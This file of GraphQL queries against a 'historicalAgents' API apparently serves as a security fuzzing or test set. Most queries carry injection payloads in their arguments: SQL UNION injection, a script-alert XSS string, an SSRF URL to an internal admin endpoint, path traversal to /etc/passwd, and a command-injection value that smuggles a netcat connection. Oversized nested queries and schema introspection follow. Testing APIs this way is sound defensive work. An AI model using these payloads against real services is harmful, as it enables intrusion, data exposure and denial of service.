query.query:
query historicalAgents {
  historicalAgents(first: 1) {
    items {
      id
      type
      identifier
    }
    pageInfo {
      hasNextPage
    }
  }
}

query historicalAgents {
  historicalAgents(from: "1' UNION SELECT * FROM agents--") {
    items {
      id
      descriptions {
        biographicalHistory
      }
    }
  }
}

query historicalAgents {
  historicalAgents(after: "<script>alert(document.domain)</script>") {
    items {
      identifier
      links {
        description
      }
    }
  }
}

query historicalAgents {
  historicalAgents(from: "http://internal-api/admin") {
    items {
      systemEvents {
        logMessage
      }
    }
  }
}

query historicalAgents {
  historicalAgents(after: ";nc -nv 127.0.0.1 4444;") {
    items {
      annotations {
        body
      }
    }
  }
}

query historicalAgents {
  historicalAgents(from: "../../../../etc/passwd") {
    items {
      accessPoints {
        name
      }
    }
  }
}

query historicalAgents {
  historicalAgents(after: "<h1>Unauthorized Access</h1>") {
    items {
      related {
        item {
          ... on HistoricalAgent {
            legalStatus
          }
        }
      }
    }
  }
}

query historicalAgents {
  historicalAgents(first: 10000) {
    items {
      systemEvents {
        timestamp
        eventType
      }
      connected {
        context {
          targets {
            ... on HistoricalAgent {
              id
            }
          }
        }
      }
    }
  }
}

query historicalAgents {
  s: historicalAgents(first: 10000) {
    i: items {
      e: systemEvents {
        t: timestamp
      }
      c: connected {
        ctx: context {
          tgt: targets {
            ... on HistoricalAgent {
              uid: id
            }
          }
        }
      }
    }
  }
}

query {
  historicalAgents {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

query historicalAgents {
  historicalAgents {
    items {
      id
      identifire
      descripcion
      lnk: lnks {
        target
      }
    }
  }
}
